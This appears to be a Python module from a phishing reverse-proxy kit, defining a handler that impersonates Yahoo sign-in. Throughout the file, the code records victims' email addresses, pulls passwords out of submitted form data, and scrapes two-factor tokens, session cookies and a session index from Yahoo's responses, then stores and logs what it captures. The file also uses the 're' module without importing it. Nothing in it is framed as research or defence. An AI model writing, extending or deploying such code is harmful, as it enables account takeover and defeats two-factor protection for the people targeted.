from proxy_base import BaseProxyHandler
import logging
from urllib.parse import urlparse
from bs4 import BeautifulSoup

class YahooProxyHandler(BaseProxyHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)
        email = parsed_url.fragment or "unknown"
        self.analytics.log_event('visit', self.session_id, self.config['service_name'], {'path': self.path, 'email': email})
        self.proxy_request('GET')

    def capture_data(self, post_data, response):
        captured = {}
        if post_data:
            try:
                post_str = post_data.decode()
                for rule in self.config['capture_rules']['credentials']:
                    field = rule['field']
                    selector = rule['selector']
                    if re.search(selector, post_str):
                        match = re.search(rf"{selector}=([^&]+)", post_str)
                        if match:
                            captured[field] = match.group(1)
            except Exception as e:
                logging.warning(f"POST parse error: {e}")

        if '2fa_token' in self.config['capture_rules']:
            selector = self.config['capture_rules']['2fa_token']
            soup = BeautifulSoup(response.text, 'html.parser')
            token_input = soup.select_one(selector)
            if token_input and token_input.get('value'):
                captured['2fa_token'] = token_input.get('value')

        cookies = response.cookies.get_dict()
        if cookies:
            captured['cookies'] = {
                k: v for k, v in cookies.items()
                if k in self.config['capture_rules']['cookies']
            }

        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            session_input = soup.select_one('input[name="sessionIndex"]')
            if session_input:
                captured['session_index'] = session_input.get('value')
        except Exception as e:
            logging.warning(f"Yahoo session error: {e}")

        if captured:
            self.store.save(captured, self.session_id, self.config['service_name'])
            self.analytics.log_event('capture', self.session_id, self.config['service_name'], captured)

        return captured

    def rewrite_response(self, content):
        content = super().rewrite_response(content)
        soup = BeautifulSoup(content, 'html.parser')
        meta = soup.new_tag('meta')
        meta['name'] = 'mobile-web-app-capable'
        meta['content'] = 'yes'
        soup.head.append(meta)
        viewport = soup.new_tag('meta')
        viewport['name'] = 'viewport'
        viewport['content'] = 'width=device-width, initial-scale=1.0'
        soup.head.append(viewport)
        return str(soup)
